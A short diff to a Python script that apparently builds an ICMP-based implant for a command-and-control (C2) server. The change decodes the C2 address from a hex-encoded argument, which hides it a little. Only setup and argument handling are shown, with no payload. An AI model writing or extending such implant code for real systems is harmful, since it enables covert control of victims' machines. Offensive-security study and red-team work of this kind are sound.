@@ -9,6 +9,8 @@ from scapy.all import sniff
 from lib.shlib import Host
 from subprocess import STDOUT, check_output, TimeoutExpired
 import os
+import struct
+import socket
 import sys
 
 ICMP_ID = int(12800)
@@ -18,7 +20,13 @@ TTL = int(64)
 if sys.argv[1] is None:
     print("Please supply an IP of the C2")
     sys.exit()
-controller_ip = sys.argv[1]
+
+# Gets the controller ip from sys argv
+addr_long = int(sys.argv[1], 16)
+c_ip = socket.inet_ntoa(struct.pack("<L", addr_long))
+c_ip = c_ip.split(".")
+controller_ip = f"{c_ip[3]}.{c_ip[2]}.{c_ip[1]}.{c_ip[0]}"
+print(controller_ip)
 
 class Implant(Host):
     """
